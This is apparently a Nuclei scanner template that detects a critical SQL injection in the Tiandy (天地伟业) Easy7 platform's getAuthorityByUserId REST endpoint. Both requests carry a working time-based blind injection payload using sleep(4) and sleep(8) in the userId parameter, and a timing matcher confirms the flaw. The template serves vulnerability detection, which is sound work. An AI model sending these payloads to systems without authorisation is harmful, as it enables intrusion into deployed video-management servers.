id: TianDiWeiYe-Easy7-getAuthorityByUserId-SQL

info:
  name: 天地伟业Easy7 getAuthorityByUserId SQL注入
  author: HuanXiong
  severity: critical
  reference: |
    -
  tags: SQL Injection
  
http:
  - raw:
      - |
        GET /Easy7/rest/user/getAuthorityByUserId?userId=a'and(select*from(select+sleep(4))a+union+select+1)='&objId=1&authTypes.authTypes=1 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

      - |
        GET /Easy7/rest/user/getAuthorityByUserId?userId=a'and(select*from(select+sleep(8))a+union+select+1)='&objId=1&authTypes.authTypes=1 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"